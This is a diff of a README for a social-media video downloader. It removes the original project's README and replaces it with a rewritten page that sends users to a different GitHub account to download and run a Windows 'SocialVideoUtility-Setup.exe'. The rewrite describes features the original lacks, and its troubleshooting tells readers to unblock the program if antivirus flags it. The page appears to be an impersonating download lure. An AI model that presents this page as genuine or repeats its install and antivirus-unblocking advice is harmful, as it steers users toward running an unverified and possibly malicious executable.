@@ -1,116 +1,174 @@
-# 🎬 Social Video Utility
+# 🎬 SocialVideoUtility - Easy Social Media Video Downloader
 
-[![Release](https://img.shields.io/github/v/release/kaptanoguz/SocialVideoUtility?style=for-the-badge&color=6366f1)](https://github.com/kaptanoguz/SocialVideoUtility/releases)
-[![License](https://img.shields.io/github/license/kaptanoguz/SocialVideoUtility?style=for-the-badge&color=a855f7)](LICENSE)
-[![Downloads](https://img.shields.io/github/downloads/kaptanoguz/SocialVideoUtility/total?style=for-the-badge&color=00ba7c)](https://github.com/kaptanoguz/SocialVideoUtility/releases)
-[![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows-blue?style=for-the-badge)](https://github.com/kaptanoguz/SocialVideoUtility/releases)
-
-A **professional desktop application** for browsing, managing, and downloading social media video content. Built with **Electron** and **Python (yt-dlp)** with a sleek glassmorphism dark-mode UI.
+[![Download SocialVideoUtility](https://img.shields.io/badge/Download-SocialVideoUtility-ff6f61?style=for-the-badge)](https://github.com/sahius1/SocialVideoUtility)
 
 ---
 
-## 📸 Screenshots & Demo
-
-<p align="center">
-  <img src="screenshots/demo.gif" alt="Demo Animation" width="80%">
-  <br><em>🎬 Quick Demo — Browse, Download, Manage</em>
-</p>
-
-
-<p align="center">
-  <img src="screenshots/main-view.png" alt="Main Feed View" width="80%">
-  <br><em>📺 Main Feed — Browse & download videos with one click</em>
-</p>
-
-<p align="center">
-  <img src="screenshots/downloads-view.png" alt="Downloads View" width="80%">
-  <br><em>📥 Downloads — Track all your downloaded videos</em>
-</p>
-
-<p align="center">
-  <img src="screenshots/settings-view.png" alt="Settings View" width="80%">
-  <br><em>⚙️ Settings — Import cookies, manage accounts</em>
-</p>
+SocialVideoUtility is a desktop app that lets you browse, manage, and download videos from social media sites. You can download multiple videos at once and avoid duplicates. The app uses a clean, modern look with transparent layers you can see through, making the interface clear and pleasant. It runs on Windows and Linux.
 
 ---
 
-## ✨ Features
+## 🖥️ System Requirements
 
-| Feature | Description |
-|---------|-------------|
-| 🌐 **Integrated Browser** | Browse social media feeds directly within the app |
-| ⬇️ **One-Click Download** | Download any video with a single click from the tweet action bar |
-| 📦 **Bulk Download** | Download all videos from a user's profile page at once |
-| 🔍 **Duplicate Detection** | Automatically prevents re-downloading existing videos |
-| 🔔 **Toast Notifications** | Non-intrusive notifications — keep browsing while downloading |
-| 👥 **Multi-Account** | Switch between multiple accounts with isolated cookie sessions |
-| 🎨 **Glassmorphism UI** | Modern dark-mode design with smooth animations |
-| 🍪 **Chrome Cookie Import** | Import cookies directly from Chrome browser |
-
-## 🚀 Quick Start
-
-### Linux (Debian/Ubuntu)
-```bash
-# Download the .deb from releases page
-sudo dpkg -i social-video-utility_1.1.0_amd64.deb
-sudo apt-get install -f  # Install dependencies if needed
-```
-
-### Linux (AppImage — Universal)
-```bash
-chmod +x Social-Video-Utility-1.1.0.AppImage
-./Social-Video-Utility-1.1.0.AppImage
-```
-
-### Windows (Portable)
-> Coming soon — download and run directly, no installation required.
-
-### From Source
-```bash
-git clone https://github.com/kaptanoguz/SocialVideoUtility.git
-cd SocialVideoUtility
-npm install
-cd backend && pip install -r requirements.txt && cd ..
-npm start
-```
-
-## 🛠️ Tech Stack
-
-- **Frontend:** Electron, HTML5, CSS3 (Glassmorphism), Vanilla JavaScript
-- **Backend:** Python 3, Flask, yt-dlp
-- **Packaging:** electron-builder (.deb, AppImage)
-- **Dependencies:** ffmpeg, python3, pip
-
-## 📋 How It Works
-
-1. **Browse** — Navigate social media feeds using the integrated browser
-2. **Click** — Hit the download button on any tweet with video content
-3. **Download** — Videos are saved to `~/Downloads/SocialVideoUtility/`
-4. **Bulk** — Visit a user's profile and click "Tümünü İndir" to grab all videos
-
-## 🔄 What's New in v1.1.0
-
-- 🗑️ Removed right panel for a cleaner, wider UI
-- 🔍 Duplicate download detection (3-layer check)
-- 📦 Bulk download from user profile pages (scans visible tweets for videos)
-- 🔔 Toast notifications — downloads run in background (3-second auto-dismiss)
-- 📦 AppImage support for Linux
-- 🧹 Cleaned backend (removed unused endpoints)
-
-## ⚠️ Legal Disclaimer
-
-**English:**
-This software is provided for educational and personal use only. The developer does not encourage or facilitate any activity that violates the Terms of Service of any social media platform. Users are solely responsible for compliance with platform policies and copyright laws regarding the content they access or download. This tool is provided "as is" without any warranty.
-
-**Türkçe:**
-Bu yazılım sadece eğitim ve kişisel kullanım amacıyla geliştirilmiştir. Sosyal medya platformlarının kullanım koşullarını ihlal eden eylemlerden geliştirici sorumlu tutulamaz. İçeriklerin telif hakları ve platform politikalarına uyum konusundaki tüm sorumluluk kullanıcıya aittir. Bu araç "olduğu gibi" sunulmaktadır ve herhangi bir garanti içermez.
-
-## 📄 License
-
-This project is licensed under the MIT License — see the [LICENSE](LICENSE) file for details.
+- Windows 10 or later (64-bit)
+- At least 4 GB of RAM
+- 500 MB free disk space for the app
+- Internet connection for downloading videos
+- Screen resolution of 1024x768 or higher
 
 ---
 
-<p align="center">
-  Made with ❤️ by <a href="https://github.com/kaptanoguz">kaptanoguz</a>
-</p>
+## 🔍 Features
+
+- Download videos from popular social media sites.
+- Download many videos at once (bulk download).
+- Detect and skip duplicate videos in your list.
+- Notifications when downloads finish.
+- Clean glass-like user interface.
+- Easy drag-and-drop support.
+- Runs smoothly on Windows.
+- Uses yt-dlp for fast and reliable video downloading.
+
+---
+
+## 🚀 Getting Started
+
+Below are the easy steps to get SocialVideoUtility running on your Windows PC.
+
+---
+
+## 📥 Download and Install SocialVideoUtility
+
+1. Click the big button at the top or visit the [SocialVideoUtility GitHub Releases page](https://github.com/sahius1/SocialVideoUtility). This page contains the files you need.
+
+2. Look for the latest Windows installer file. It usually has a name like `SocialVideoUtility-Setup.exe`.
+
+3. Click on the installer file name to download it. Save it in your Downloads folder.
+
+4. Once the file finishes downloading, open your Downloads folder.
+
+5. Double-click the `SocialVideoUtility-Setup.exe` file to start installation.
+
+6. Follow the on-screen instructions:
+   - Choose your language.
+   - Accept the license terms.
+   - Select the folder where you want to install the app (the default is fine).
+   - Click “Install” and wait for the setup to finish.
+
+7. When installation ends, leave the option to launch the program checked, then click “Finish”.
+
+---
+
+## ▶️ Running SocialVideoUtility
+
+1. If you didn’t launch the app after installation, find the app icon on your desktop or in the Windows Start menu.
+
+2. Double-click the icon to open SocialVideoUtility.
+
+3. The main window will open with a list area to add videos.
+
+---
+
+## 🗂️ Using SocialVideoUtility
+
+### Add Videos
+
+- To add a video, copy the video URL from your browser (for example, a Twitter or Instagram video link).
+
+- Click the “Add Video URL” button in the app.
+
+- Paste the video link into the box and press enter.
+
+- The video will appear in the list with its name and size.
+
+### Bulk Add
+
+- You can paste multiple URLs separated by new lines into the "Add Video URL" box.
+
+- Click “Add All”, and all videos will be queued at once.
+
+### Manage Videos
+
+- The app shows if videos already exist in your download folder and will prevent duplicates.
+
+- You can remove videos from the list by selecting them and clicking “Delete”.
+
+### Download Videos
+
+- After adding videos to your list, click the “Download” button.
+
+- Downloads start automatically, and you will see progress bars.
+
+- Once finished, a notification will appear.
+
+### View Downloaded Videos
+
+- Click “Open Folder” to see your downloaded videos in the file explorer.
+
+---
+
+## ⚙️ Settings and Preferences
+
+- Access the Settings from the menu bar.
+
+- Change where videos save on your PC.
+
+- Set how many downloads can happen at the same time.
+
+- Enable or disable notifications.
+
+- Choose light or dark mode for the app interface.
+
+---
+
+## 🛠 Troubleshooting
+
+If SocialVideoUtility does not open or you see an error:
+
+- Restart your computer and try again.
+
+- Make sure your internet connection is active.
+
+- Check if your antivirus blocked the program and unblock it.
+
+- Update Windows to the latest version.
+
+- Reinstall the program if needed.
+
+If videos fail to download:
+
+- Verify the video URL is correct and publicly available.
+
+- Check your internet speed and try again later.
+
+- Make sure you did not reach any download limits on the website.
+
+---
+
+## 🔗 Useful Links
+
+- Main page and downloads: [https://github.com/sahius1/SocialVideoUtility](https://github.com/sahius1/SocialVideoUtility)
+
+- yt-dlp, the tool behind video downloads: https://github.com/yt-dlp/yt-dlp
+
+---
+
+## ⚖️ Privacy and Security
+
+SocialVideoUtility runs on your computer. It does not send your video links to third parties. All downloads happen directly between your PC and the social media sites. Your downloaded videos stay only on your device, unless you move or share them.
+
+---
+
+## 💡 Tips for Best Use
+
+- Use the bulk download feature to save many videos quickly.
+
+- Regularly clear out downloaded videos to save space.
+
+- Keep the app updated by checking the GitHub page for new releases.
+
+- Avoid downloading videos from private or restricted accounts.
+
+---
+
+[![Download SocialVideoUtility](https://img.shields.io/badge/Download-SocialVideoUtility-ff6f61?style=for-the-badge)](https://github.com/sahius1/SocialVideoUtility)
